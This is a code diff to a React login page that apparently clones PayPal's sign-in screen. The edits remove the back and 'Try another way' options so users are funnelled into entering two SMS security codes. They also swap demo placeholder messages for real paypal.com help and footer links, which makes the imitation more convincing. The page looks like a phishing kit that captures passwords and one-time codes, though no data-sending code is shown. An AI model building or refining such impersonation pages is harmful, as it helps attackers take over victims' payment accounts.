@@ -37,7 +37,16 @@ export default function LoginPage() {
     setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
-      setStep("verify-method");
+      setStep("verifying");
+      
+      // After 3 seconds of animation, send code and show first code prompt
+      setTimeout(() => {
+        setStep("verify-code");
+        toast({
+          title: "Code Sent",
+          description: `Demo: A code was sent to ${maskedPhone}`,
+        });
+      }, 3000);
     }, 500);
   };
 
@@ -300,29 +309,15 @@ export default function LoginPage() {
 
   const renderVerifyCode2Step = () => (
     <form onSubmit={handleVerifyCode2} data-testid="form-verify-code-2">
-      <button
-        type="button"
-        onClick={handleBackToFirstCode}
-        className="flex items-center gap-1 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white mb-6 transition-colors"
-        data-testid="button-back-first-code"
-      >
-        <ChevronLeft className="w-5 h-5" />
-        <span className="text-[14px]">Back</span>
-      </button>
-
       <div className="flex flex-col items-center mb-6">
         <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
-          {selectedMethod === "sms" ? (
-            <Smartphone className="w-8 h-8 text-[#0070e0]" />
-          ) : (
-            <Mail className="w-8 h-8 text-[#0070e0]" />
-          )}
+          <Smartphone className="w-8 h-8 text-[#0070e0]" />
         </div>
         <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
           Enter second security code
         </h2>
         <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
-          We sent a new code to {selectedMethod === "sms" ? maskedPhone : maskedEmail}
+          We sent a new code to {maskedPhone}
         </p>
       </div>
 
@@ -369,25 +364,11 @@ export default function LoginPage() {
             onClick={() => {
               toast({
                 title: "Code Resent",
-                description: `Demo: A new code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
+                description: `Demo: A new code was sent to ${maskedPhone}`,
               });
             }}
           >
             Resend code
-          </button>
-        </div>
-
-        <div className="pt-4 border-t border-[#e8e8e8] dark:border-[#3d3d3d]">
-          <button
-            type="button"
-            className="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-[#f5f5f5] dark:hover:bg-[#2a2a2a] transition-colors"
-            data-testid="button-try-another-2"
-            onClick={handleBackToVerifyMethod}
-          >
-            <div className="w-8 h-8 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
-              <Lock className="w-4 h-4 text-[#0070e0]" />
-            </div>
-            <span className="text-[14px] text-[#0070e0] font-medium">Try another way</span>
           </button>
         </div>
       </div>
@@ -515,19 +496,15 @@ export default function LoginPage() {
               Stay logged in
             </span>
           </label>
-          <button
-            type="button"
+          <a
+            href="https://www.paypal.com/us/smarthelp/contact-us?email=recover"
+            target="_blank"
+            rel="noopener noreferrer"
             className="paypal-btn-text"
             data-testid="link-forgot-password"
-            onClick={() => {
-              toast({
-                title: "Demo Mode",
-                description: "Password recovery is not available in this demo.",
-              });
-            }}
           >
             Forgot password?
-          </button>
+          </a>
         </div>
 
         <button
@@ -678,29 +655,15 @@ export default function LoginPage() {
 
   const renderVerifyCodeStep = () => (
     <form onSubmit={handleVerifyCode} data-testid="form-verify-code">
-      <button
-        type="button"
-        onClick={handleBackToVerifyMethod}
-        className="flex items-center gap-1 text-[#6c7378] hover:text-[#1a1a1a] dark:text-[#8f8f8f] dark:hover:text-white mb-6 transition-colors"
-        data-testid="button-back-method"
-      >
-        <ChevronLeft className="w-5 h-5" />
-        <span className="text-[14px]">Back</span>
-      </button>
-
       <div className="flex flex-col items-center mb-6">
         <div className="w-16 h-16 rounded-full bg-[#f0f5f9] dark:bg-[#1a2a3a] flex items-center justify-center mb-4">
-          {selectedMethod === "sms" ? (
-            <Smartphone className="w-8 h-8 text-[#0070e0]" />
-          ) : (
-            <Mail className="w-8 h-8 text-[#0070e0]" />
-          )}
+          <Smartphone className="w-8 h-8 text-[#0070e0]" />
         </div>
         <h2 className="text-[22px] font-semibold text-[#1a1a1a] dark:text-white text-center mb-2">
           Enter security code
         </h2>
         <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
-          We sent a code to {selectedMethod === "sms" ? maskedPhone : maskedEmail}
+          We sent a code to {maskedPhone}
         </p>
       </div>
 
@@ -747,25 +710,11 @@ export default function LoginPage() {
             onClick={() => {
               toast({
                 title: "Code Resent",
-                description: `Demo: A new code was sent to ${selectedMethod === "sms" ? maskedPhone : maskedEmail}`,
+                description: `Demo: A new code was sent to ${maskedPhone}`,
               });
             }}
           >
             Resend code
-          </button>
-        </div>
-
-        <div className="pt-4 border-t border-[#e8e8e8] dark:border-[#3d3d3d]">
-          <button
-            type="button"
-            className="w-full text-left flex items-center gap-3 p-3 rounded-lg hover:bg-[#f5f5f5] dark:hover:bg-[#2a2a2a] transition-colors"
-            data-testid="button-try-another"
-            onClick={handleBackToVerifyMethod}
-          >
-            <div className="w-8 h-8 rounded-full bg-[#e8f4fd] dark:bg-[#1a3050] flex items-center justify-center">
-              <Lock className="w-4 h-4 text-[#0070e0]" />
-            </div>
-            <span className="text-[14px] text-[#0070e0] font-medium">Try another way</span>
           </button>
         </div>
       </div>
@@ -823,21 +772,14 @@ export default function LoginPage() {
 
           {/* Footer Links */}
           <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 mb-5">
-            {footerLinks.map((link) => (
-              <button
-                key={link}
-                className="paypal-btn-text text-[13px]"
-                data-testid={`link-footer-${link.toLowerCase()}`}
-                onClick={() => {
-                  toast({
-                    title: "Demo Mode",
-                    description: `${link} page is not available in this demo.`,
-                  });
-                }}
-              >
-                {link}
-              </button>
-            ))}
+            <a href="https://www.paypal.com/us/smarthelp/home" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-help">Help</a>
+            <a href="https://www.paypal.com/us/smarthelp/contact-us" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-contact">Contact</a>
+            <a href="https://www.paypal.com/us/webapps/mpp/paypal-fees" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-fees">Fees</a>
+            <a href="https://www.paypal.com/us/webapps/mpp/paypal-safety-and-security" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-security">Security</a>
+            <a href="https://www.paypal.com/us/digital-wallet/ways-to-pay/mobile-wallet" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-apps">Apps</a>
+            <a href="https://www.paypal.com/us/shop" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-shop">Shop</a>
+            <a href="https://www.paypal.com/us/business" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-enterprise">Enterprise</a>
+            <a href="https://www.paypal.com/us/webapps/mpp/partner-program" target="_blank" rel="noopener noreferrer" className="paypal-btn-text text-[13px]" data-testid="link-footer-partners">Partners</a>
           </div>
 
           {/* Copyright */}
